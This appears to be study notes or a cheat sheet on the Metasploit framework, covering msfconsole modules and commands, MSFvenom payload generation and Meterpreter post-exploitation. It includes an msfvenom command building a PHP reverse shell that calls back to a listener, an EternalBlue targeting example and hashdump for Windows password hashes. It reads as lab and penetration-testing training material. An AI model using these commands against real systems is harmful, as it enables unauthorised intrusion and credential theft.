#### [Documentation](https://docs.metasploit.com/)

# Metasploit
## Description
Metasploit is an exploitation framework/suite of tools designed to automatically detect standard software and firmware vulnerabilities and deliver exploits against them.
- Start Metasploit with cmd: `msfconsole`

## Components
- **msfconsole**: The main command-line interface.
- **Modules**: Small components within Metasploit used to perform tasks such as exploits, scanners, payloads, etc.
	- **Auxiliary:** scanners, crawlers, and fuzzers.
	- **Encoders:** used to encode an exploit and payload to avoid signature-based antivirus protection.
	- **Evasion:** another way to evade detection from other antivirus detection methods.
	- **Exploit:** used to take advantage of a vulnerability on a target system to deliver a payload.
	- **Payloads:** code that will run on a target system to achieve the desired result (shell, malware, backdoor, privilege escalation).
		- **Singles (or inline):** payloads that do not need any additional components to run
		- **Stagers:** used to establish a connection between Metasploit and a target system. After a *stager* is used to create an initial contact, *stages* are sent, allowing a pentester to send additional larger payloads.
			- Advantages: Initial payload is small and avoids sending duplicate code to establish a connection when using multiple payloads.
		- **Stages:** used after a *stager*, allowing the attacker to use larger payloads.
	- **Post:** used at the end of an engagement or post-exploitation.
- **Tools**: Stand-alone tools used for vulnerability research, vulnerability assessment, and penetration testing.


## Commands
- `msfconsole` - Launches Metasploit command-line interface
- `use [path to exploit]` - Use to select a module
- `show [module type]` - lists available modules within a specified module type (all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites)
- `info` - Provides additional info on specified modules.
- `search` - Use to search the Metasploit database for modules
	- Search from CVE numbers, exploit names, or platform
	- Examples:
		- `search cve:2009 type:exploit`
		- `search cve:2009 type:exploit platform:-linux`
		- `search cve:2009 -s name`
		- `search type:exploit -s type -r`


## Commands in context
Refers to commands used after selecting a specific module. For example, you can choose a module using the `use` command followed by the path to the module.
- `show options` - Used after a module is selected to list the module and payload options available for the exploit. Lists additional info such as option name, current setting (if set), if required, and description info for each option.
- `set` - Use to set options of a module
	- Example: `msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39`
- `setg [option] [set to]` - Used to set global perameters
- `unsetg [variable]` - Clear one or more global perameters
	- To flush all entries, specify 'all' as the variable name
- `back` - Moves back to the previous location/ exits selected module
- `info` - Provides additional info on specified modules.
- `show payloads` - Show additional commands/payload options for selected exploit
- `set payload` - Use payload for selected exploit
- `exploit` - runs exploit

## Error Handling
- **Exploit completed, but no session was created**
	1) Check `show options` and make sure you are not missing `LHOST` or `LPORT` requirements to connect to shell


# MSFvenom
## Description
MSFvenom is where a pentester can access all the payloads available within Metasploit and create new payloads in different formats and operating systems.
- Allows the pentester the ability to upload raw files for exploitation

**Example of using MSFvenom to achieve a reverse shell is as follows:**
1) Generate a reverse shell script using MSFvenon in a specified file format
	- Reference "*Generating a reverse shell*" under examples
2) Deliver/install shell script onto the target machine
3) Start the Metasploit multi-handler to listen for reverse shell callbacks "catching a shell."
	- `msf6 > use exploit/multi/handler`
4) Execute the reverse shell on the target machine. After execution, your *handler* should catch the connection and allow the pentester access to the machine.

**Note:** payloads are created with comments that will prevent the payload from running unless removed. Therefore, make sure to open the payload and remove comments from the beginning and end of the file before using it.

## Commands
 - `-l, --list [type]` - List all modules for payloads, encoders, nops, platforms, archs, encrypt, formats, and all
 - `-p, --payload [payload]` - Payload to use

## Examples
- **Generating a reverse shell:**
	- `msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=1234 -f raw > reverse_shell.php`
		- `msfvenom` - specify that you are using MSFvenom
		- `-p php/reverse_php` - specifies to use payload "php/reverse_php"
		- `LHOST=10.0.0.1` - sets the local IP address (should be the IP of the machine you are using for your pentest)
		- `LPORT=1234` - sets local port used to catch reverse shell connection
		- `> reverse_shell.php` - specifies output filename

# Meterpreter
## Description
Meterpreter is a tool that runs within the target system's memory, acting as a command and control agent communicating with the attacked computer through encrypted communications. Meterpreter provides post-exploitation tools used to escalate privileges and move laterally. Additionally, you can use Meterpreter commands to interact more easily with the target operating system and files.
- **Note:** most antivirus software will detect meterpreter and is not a stealth tool.

Determining which Meterpreter payload to use can be decided using three factors:
1) Target operating system (OSX, Linux, Windows, iOS, Android, etc.)
2) Target system components (Python, PHP website, etc.)
3) Network connection (TCP, HTTPS, etc.)
- Search for Meterpreter shells using the command
	- `msfvenom --list payloads | grep meterpreter`

## Using Post-Exploitation Tools
**Post exploitation goals:**
- Gather information from the target system
- Search for files, credentials, network interfaces, etc.
- Escalate privileges
- Move laterally to another machine on the network

### Steps for using post-exploitation tools
1) Background your current meterpreter session `ctrl + Z` to use other modules
2) Check your currents sessions from msfconsole using `sessions` cmd
	 - In the future, we can go back to this session using `sessions -i #`.
3) Use the `back` cmd to exit the current module and load a post-exploitation module
	- Example: `msf6 > use post/windows/gather/enum_shares`
4) Set options for selected module and then set session id gathered previously `set SESSION 1`
5) run

## Commands
Meterpreter commands will be different for each version. To get a list of available commands, type `help`
- `hashdump` - Dumps the database contents where users' passwords are stored on Windows OS.
	- The SAM (Security Account Manager) database stores users' passwords on Windows systems.
	- Passwords are stored in the NTLM (New Technology LAN Manager) format.
- `search` - Use to locate specific files within a system
	- Example: `search -f flag.txt`
- `ctrl + Z` - Opens background session to return to msfconsole
- `sessions` - Shows current background sessions

## Converting Normal Shell to Meterpreter
**Reference:** [Upgrade Normal Shell To Meterpreter Shell](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646)
